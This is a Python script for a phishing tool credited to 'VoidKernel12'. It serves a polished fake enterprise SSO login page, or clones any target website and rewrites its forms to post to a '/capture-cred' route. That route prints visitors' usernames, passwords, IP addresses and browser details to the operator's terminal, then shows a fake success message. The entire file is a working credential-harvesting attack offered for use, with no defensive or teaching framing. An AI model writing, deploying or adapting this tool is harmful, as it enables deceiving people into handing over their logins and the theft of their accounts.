import os
import sys
import time
import requests
import logging
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from flask import Flask, render_template_string, request
from datetime import datetime

# Suppress annoying Flask/Werkzeug default server logs for a clean terminal
log = logging.getLogger('werkzeug')
log.setLevel(logging.CRITICAL)

app = Flask(__name__)
page_content = ""

# --- PURE LIGHT GOLD / AMBER COLOR PALETTE ---
GOLD = "\033[93m"        # Light Gold / Amber
WHITE = "\033[97m"       # Bright White
GREEN = "\033[92m"       # Success Green
RED = "\033[91m"         # Alert Red
RESET = "\033[0m"        # Reset Color

# Advanced, Realistic & High-Tech Enterprise SSO Login Template
DEFAULT_CRED_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enterprise Secure SSO Authentication</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background: #030712; color: #f3f4f6; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .bg-glow { position: absolute; width: 400px; height: 400px; background: rgba(251, 191, 36, 0.05); filter: blur(120px); border-radius: 50%; z-index: -1; }
        .login-container { background: rgba(11, 15, 25, 0.85); backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.08); padding: 40px; border-radius: 16px; width: 380px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.9); }
        .brand-header { text-align: center; margin-bottom: 30px; }
        .shield-icon { width: 48px; height: 48px; background: rgba(251, 191, 36, 0.1); border: 1px solid rgba(251, 191, 36, 0.3); border-radius: 12px; display: inline-flex; justify-content: center; align-items: center; margin-bottom: 12px; color: #fbbf24; font-size: 22px; font-weight: bold; }
        h2 { color: #f9fafb; font-size: 20px; font-weight: 600; letter-spacing: -0.5px; }
        p { color: #9ca3af; font-size: 13px; margin-top: 6px; }
        .input-group { margin-bottom: 18px; }
        label { display: block; font-size: 12px; font-weight: 500; color: #d1d5db; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
        input { width: 100%; padding: 12px 14px; background: #111827; border: 1px solid #374151; border-radius: 8px; color: #fff; font-size: 14px; transition: all 0.3s ease; outline: none; }
        input:focus { border-color: #fbbf24; box-shadow: 0 0 0 3px rgba(251, 191, 36, 0.15); }
        button { width: 100%; padding: 12px; background: #fbbf24; border: none; border-radius: 8px; color: #030712; font-weight: 600; font-size: 14px; cursor: pointer; transition: background 0.2s; margin-top: 10px; }
        button:hover { background: #f59e0b; }
        .security-footer { text-align: center; margin-top: 24px; font-size: 11px; color: #6b7280; display: flex; align-items: center; justify-content: center; gap: 6px; }
        .dot { width: 6px; height: 6px; background: #10b981; border-radius: 50%; display: inline-block; }
        #loader { display: none; text-align: center; padding: 20px; }
        .spinner { width: 32px; height: 32px; border: 3px solid rgba(251,191,36,0.2); border-top: 3px solid #fbbf24; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="bg-glow"></div>
    <div class="login-container" id="form-box">
        <div class="brand-header">
            <div class="shield-icon">🔒</div>
            <h2>Enterprise Identity Portal</h2>
            <p>Secure Single Sign-On Authentication</p>
        </div>
        <form method="POST" action="/capture-cred" onsubmit="showLoader(event)">
            <div class="input-group">
                <label>Corporate ID / Email</label>
                <input type="text" name="username" placeholder="name@company.com" required autocomplete="off">
            </div>
            <div class="input-group">
                <label>Security Password</label>
                <input type="password" name="password" placeholder="••••••••••••" required>
            </div>
            <button type="submit">Authenticate Session</button>
        </form>
        <div class="security-footer">
            <span class="dot"></span> 256-Bit TLS Encrypted Connection
        </div>
    </div>
    
    <div class="login-container" id="loader">
        <div class="spinner"></div>
        <h3 style="color: #fbbf24; font-size: 16px; margin-bottom: 6px;">Verifying Credentials</h3>
        <p style="color: #9ca3af; font-size: 12px;">Establishing secure encrypted tunnel...</p>
    </div>

    <script>
        function showLoader(event) {
            event.preventDefault();
            document.getElementById('form-box').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            setTimeout(() => {
                event.target.submit();
            }, 1800);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def capture_and_serve():
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    accept_lang = request.headers.get('Accept-Language', 'Unknown')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Real-time Telemetry Print on Terminal
    print(f"\n{GOLD}=================================================={RESET}")
    print(f"{GREEN} [+] TARGET VISITED THE PORTAL!{RESET}")
    print(f"{GOLD} --------------------------------------------------{RESET}")
    print(f"{WHITE} Time      : {timestamp}{RESET}")
    print(f"{WHITE} IP Address: {client_ip}{RESET}")
    print(f"{WHITE} Browser/OS: {user_agent}{RESET}")
    print(f"{WHITE} Language  : {accept_lang}{RESET}")
    print(f"{GOLD}=================================================={RESET}")
    
    return render_template_string(page_content)

@app.route('/capture-cred', methods=['POST'])
def capture_cred():
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    form_data = dict(request.form)
    
    # Real-time Credentials & Data Print on Terminal
    print(f"\n{RED}=================================================={RESET}")
    print(f"{RED} [!] CREDENTIALS & DATA CAPTURED SUCCESSFULLY!{RESET}")
    print(f"{GOLD} --------------------------------------------------{RESET}")
    print(f"{WHITE} Time      : {timestamp}{RESET}")
    print(f"{WHITE} IP Address: {client_ip}{RESET}")
    print(f"{WHITE} Browser/OS: {user_agent}{RESET}")
    print(f"{GOLD} --------------------------------------------------{RESET}")
    for key, value in form_data.items():
        print(f"{GREEN} {key.capitalize()} : {WHITE}{value}{RESET}")
    print(f"{RED}=================================================={RESET}")
    
    return "<h2 style='color:#10b981; text-align:center; margin-top:35vh; font-family:sans-serif;'>Authentication Successful. Redirecting to workspace...</h2>"

def show_banner():
    os.system('clear')
    print(f"{GOLD}")
    print("  ██████╗ █████╗ ██████╗ ██████╗ ██╗   ██╗██████╗ ███████╗")
    print(" ██╔════╝██╔══██╗██╔══██╗██╔══██╗██║   ██║██╔══██╗██╔════╝")
    print(" ██║     ███████║██████╔╝██████╔╝██║   ██║██████╔╝█████╗  ")
    print(" ██║     ██╔══██║██╔═══╝ ██╔═══╝ ██║   ██║██╔══██╗██╔══╝  ")
    print(" ╚██████╗██║  ██║██║     ██║     ╚██████╔╝██║  ██║███████╗")
    print("  ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚══════╝")
    print("  ████████╗ ██████╗  ██████╗ ██╗                         ")
    print("  ╚══██╔══╝██╔═══██╗██╔═══██╗██║                         ")
    print("     ██║   ██║   ██║██║   ██║██║                         ")
    print("     ██║   ██║   ██║██║   ██║██║                         ")
    print("     ██║   ╚██████╔╝╚██████╔╝███████╗                    ")
    print("     ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝                    ")
    print("  ========================================================")
    print("               [ BROWSER DATA PHISHING ]                  ")
    print("               [ Creator: VoidKernel12 ]                  ")
    print("  ========================================================{RESET}\n")

if __name__ == '__main__':
    show_banner()
    
    # --- MAIN MENU ---
    print(f"{GOLD}[?] MAIN MENU:{RESET}")
    print(f"  {GOLD}[1]{WHITE} Browser Data Phishing")
    print(f"  {GOLD}[2]{WHITE} Exit")
    
    main_choice = input(f"\n{GOLD}[::] Enter choice (1-2): {RESET}").strip()
    
    if main_choice == "2":
        print(f"\n{RED}[!] Exiting tool. Goodbye!{RESET}\n")
        sys.exit(0)
    elif main_choice != "1":
        print(f"\n{RED}[!] Invalid choice. Exiting tool...{RESET}\n")
        sys.exit(1)

    # 1. Port Input & Strict Validation
    port_input = input(f"\n{GOLD}[::] Enter valid Port (e.g., 8080): {RESET}").strip()
    try:
        PORT = int(port_input)
        if PORT < 1024 or PORT > 65535:
            print(f"\n{RED}[!] ERROR: Port {PORT} is restricted or invalid! Please use a port between 1024 and 65535.{RESET}")
            print(f"{RED}[!] Tool execution halted.{RESET}\n")
            sys.exit(1)
    except ValueError:
        print(f"\n{RED}[!] ERROR: Invalid port format! Please enter numbers only.{RESET}\n")
        sys.exit(1)

    # 2. Template Source Selection
    print(f"\n{GOLD}[?] SELECT TEMPLATE SOURCE:{RESET}")
    print(f"  {GOLD}[1]{WHITE} Default Website Template")
    print(f"  {GOLD}[2]{WHITE} Target Website (Clone URL)")
    
    source_choice = input(f"\n{GOLD}[::] Enter choice (1-2): {RESET}").strip()
    
    if source_choice == "2":
        target_url = input(f"\n{GOLD}[::] Enter Target URL to Clone: {RESET}").strip()
        if not target_url.startswith("http"):
            target_url = "https://" + target_url
            
        # Spinner Animation
        print(f"\n{GOLD}[*] Inspecting and cloning target website...{RESET}", end="")
        spinner_chars = ["/", "-", "\\", "|"]
        for _ in range(12):
            for char in spinner_chars:
                sys.stdout.write(f"\r{GOLD}[*] Inspecting target structure & assets... {char}{RESET}")
                sys.stdout.flush()
                time.sleep(0.1)
        print()
        
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            response = requests.get(target_url, headers=headers, timeout=12)
            
            parsed_url = urlparse(target_url)
            base_domain = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Advanced Asset & Form Rewriting Engine
            for tag in soup.find_all(['img', 'script']):
                if tag.get('src') and not tag['src'].startswith('http'):
                    tag['src'] = urljoin(base_domain, tag['src'])
                    
            for tag in soup.find_all('link'):
                if tag.get('href') and not tag['href'].startswith('http'):
                    tag['href'] = urljoin(base_domain, tag['href'])
                    
            for form in soup.find_all('form'):
                form['action'] = '/capture-cred'
                form['method'] = 'POST'
                
            page_content = str(soup)
            print(f"{GREEN}[+] Target page cloned, structured and synchronized successfully! ✔{RESET}")
        except Exception as e:
            print(f"\n{RED}[-] Error cloning target URL: {e}{RESET}")
            print(f"{GOLD}[*] Falling back to default website template...{RESET}")
            time.sleep(1)
            page_content = DEFAULT_CRED_TEMPLATE
    else:
        print(f"\n{GOLD}[*] Loading advanced default security template...{RESET}")
        time.sleep(1)
        print(f"{GREEN}[+] Default template loaded successfully! ✔{RESET}")
        page_content = DEFAULT_CRED_TEMPLATE

    # 3. Server Activation
    print(f"\n{GREEN}[+] BROWSER DATA PHISHING Server active on {GOLD}http://127.0.0.1:{PORT}{RESET}")
    print(f"{RED}[!] Waiting for target connections... (Live terminal logging enabled){RESET}\n")
    
    app.run(host='0.0.0.0', port=PORT, debug=False)
